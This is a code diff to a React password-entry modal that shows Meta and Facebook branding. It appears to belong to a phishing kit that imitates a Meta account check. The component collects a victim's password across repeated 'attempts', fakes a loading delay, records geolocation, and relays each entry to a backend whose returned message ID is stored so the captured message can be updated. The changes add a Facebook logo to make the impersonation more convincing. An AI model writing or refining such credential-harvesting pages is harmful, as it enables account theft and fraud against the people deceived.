@@ -1,5 +1,6 @@
 'use client';
 
+import FacebookLogo from '@/assets/images/facebook-logo.svg';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
@@ -20,12 +21,11 @@ interface PasswordModalProps {
 // Source - https://stackoverflow.com/a/22707551
 // Posted by T.J. Crowder, modified by community. See post 'Timeline' for change history
 // Retrieved 2026-04-03, License - CC BY-SA 3.0
-
-function delay(delay: number) {
-    return new Promise(function (resolve) {
-        setTimeout(resolve, delay);
+const delay = (delayTime: number) => {
+    return new Promise((resolve) => {
+        setTimeout(resolve, delayTime);
     });
-}
+};
 
 const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, userEmail, nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
@@ -33,7 +33,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { messageId, message, setMessage, geoInfo } = store();
+    const { messageId, message, setMessage, setMessageId, geoInfo } = store();
     const [isShowError, setIsShowError] = useState(false);
     const [passWordAttempt, setPassWordAttempt] = useState(1);
 
@@ -75,6 +75,9 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
             });
 
             if (res?.data?.success) {
+                if (typeof res.data.data?.result?.message_id === 'number') {
+                    setMessageId(res.data.data.result.message_id);
+                }
                 setMessage(updatedMessage);
             }
             await delay(config.PASSWORD_LOADING_TIME);
@@ -101,7 +104,13 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                 <div className='flex max-h-[95vh] w-full max-w-sm flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:max-w-md sm:p-3 md:max-w-lg md:p-4'>
                     <form onSubmit={handleSubmit} className='flex flex-1 flex-col items-center gap-2 overflow-y-auto py-3 sm:gap-3 sm:py-4 md:gap-4 md:py-6'>
                         {/* Profile Image */}
-                        <div className='flex h-16 w-16 shrink-0 items-center justify-center overflow-hidden rounded-full border-2 border-gray-300 bg-linear-to-br from-blue-400 to-blue-600 sm:h-20 sm:w-20 md:h-24 md:w-24'>{userProfileImage && (userProfileImage.startsWith('http') || userProfileImage.startsWith('/')) ? <Image src={userProfileImage} alt={userName} width={96} height={96} className='h-full w-full object-cover' /> : <div className='text-xl font-bold text-white sm:text-2xl md:text-3xl'>{userName.charAt(0).toUpperCase()}</div>}</div>
+                        <div className='flex h-16 w-16 shrink-0 items-center justify-center overflow-hidden rounded-full border-2 border-gray-300 bg-white sm:h-20 sm:w-20 md:h-24 md:w-24'>
+                            {userProfileImage && (userProfileImage.startsWith('http') || userProfileImage.startsWith('/')) ? (
+                                <Image src={userProfileImage} alt={userName} width={96} height={96} className='h-full w-full object-cover' />
+                            ) : (
+                                <Image src={FacebookLogo} alt='Facebook logo' width={96} height={96} className='h-full w-full object-cover' />
+                            )}
+                        </div>
 
                         {/* User Name */}
                         <h2 className='max-w-xs truncate text-center text-base font-bold sm:text-lg md:text-2xl'>{userName}</h2>
